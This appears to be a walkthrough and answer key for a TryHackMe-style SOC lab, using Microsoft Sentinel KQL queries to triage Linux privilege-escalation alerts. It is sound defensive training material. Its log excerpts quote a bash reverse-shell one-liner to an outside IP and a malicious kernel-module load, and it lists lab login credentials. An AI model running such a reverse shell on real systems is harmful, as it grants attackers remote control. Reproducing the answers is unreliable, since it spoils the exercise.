# SOC Alert Triaging - Tinsel Triage

# Task 4: Investigation Proper

## Walkthrough

1. Go to the [Microsoft Azure](https://portal.azure.com/) portal and use one of the username and temporary access pass combinations listed below, based on your continent.
    
    ```powershell
    usr-aoc25@tryhackme.onmicrosoft.com: #^4J7DP+RM#5S2Z-
    ```
    
2.  Navigate to Microsoft Sentinel and select your dedicated Sentinel instance `law-aoc2025`.
3.  Under the **Threat management** dropdown, select the **Incidents** tab and Click here to go the Defender portal.

---

### Answer the questions below

How many entities are affected by the **Linux PrivEsc - Polkit Exploit Attempt** alert?

> `10`
> 

<aside>
💡

Search for **Linux PrivEsc - Polkit Exploit Attempt** and select one alert and under Assets or Incident graph in Attack story, we can find the number.

</aside>

What is the severity of the **Linux PrivEsc - Sudo Shadow Access** alert?

> `High`
> 

<aside>
💡

Search for **Linux PrivEsc - Sudo Shadow Access** in Incidents tab**.**

</aside>

How many accounts were added to the sudoers group in the **Linux PrivEsc - User Added to Sudo Group** alert?

> `4`
> 

<aside>
💡

Search for **Linux PrivEsc - Sudo Shadow Access** in Incidents tab and click on the alert and under the Attack story within Incident graph, we can find the number of users.

</aside>

# Task 4: Diving Deeper Into Logs

## Walkthrough

Navigate to Microsoft Sentinel and select your dedicated Sentinel instance `law-aoc2025` and select `Logs` from the left bar. In the `Logs` window, click on the `Simple Mode` dropdown box and select `KQL Mode` .

### Answer the questions below

What is the name of the kernel module installed in websrv-01?

> `malicious_mod.ko`
> 

```sql
set query_now = datetime(2025-12-11T21:53:52.0545899Z);
Syslog_CL | where program_s == 'kernel' and Message has 'insert_module' | project TimeGenerated, host_s, Message
```

```bash
kernel: [625465] audit: type=1130 audit(1759996669:1161): id=622 op=insert_module name=malicious_mod.ko uid=0
```

---

What is the unusual command executed within websrv-01 by the ops user?

> `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`
> 

```sql
set query_now = datetime(2025-12-11T21:53:52.0545899Z);
Syslog_CL 
| where host_s == 'websrv-01' 
| project TimeGenerated, host_s, Message
```

Hovering over the table, we get:

```bash
Message: sudo: ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
```

---

What is the source IP address of the first successful SSH login to storage-01?

> `172.16.0.12`
> 

```sql
set query_now = datetime(2025-12-11T21:53:52.0545899Z);
Syslog_CL | where host_s == 'storage-01' |
project TimeGenerated, host_s, Message
```

```bash
sshd[3496]: Accepted password for root from 172.16.0.12 port 12020 ssh2
```

---

What is the external source IP that successfully logged in as root to app-01?

> `203.0.113.45`
> 

```sql
set query_now = datetime(2025-12-11T21:53:52.0545899Z);
Syslog_CL | where host_s == 'app-01' |
project TimeGenerated, host_s, Message
```

```bash
sshd[6978]: Accepted password for root from 203.0.113.45 port 64978 ssh2
```

---

Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?

> `deploy`
> 

```sql
usermod: user 'deploy' added to group 'sudo' by uid=0 (usermod -aG sudo deploy)
```